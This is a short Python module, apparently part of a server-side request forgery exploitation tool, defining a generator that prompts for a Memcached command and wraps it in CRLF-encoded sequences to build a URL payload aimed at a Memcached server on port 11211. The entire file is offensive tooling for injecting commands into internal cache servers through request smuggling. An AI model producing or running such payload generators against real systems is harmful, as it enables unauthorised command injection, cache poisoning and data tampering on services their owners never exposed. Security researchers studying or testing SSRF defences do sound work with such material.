from .base import *

class DumpMemcached(GENERATOR):
    default_port = 11211
    requirement = ["code"]

    def __init__(self, parser, options=None):
        super().__init__(parser, options)
        self.set_requirement(self.requirement)
        arg = self.get_requirement()
        if arg.code == "":
            self.code = self.wizard()
        else:
            self.code = arg.code

    def generate(self):
        self.set_url_payload(self.code).\
            prefix("%0d%0a").\
            suffix("%0d%0a")
        return super().generate()

    def wizard(self):
        return input("\033[96m" + "Give payload you want to run in Memcached Server: " + "\033[0m")

    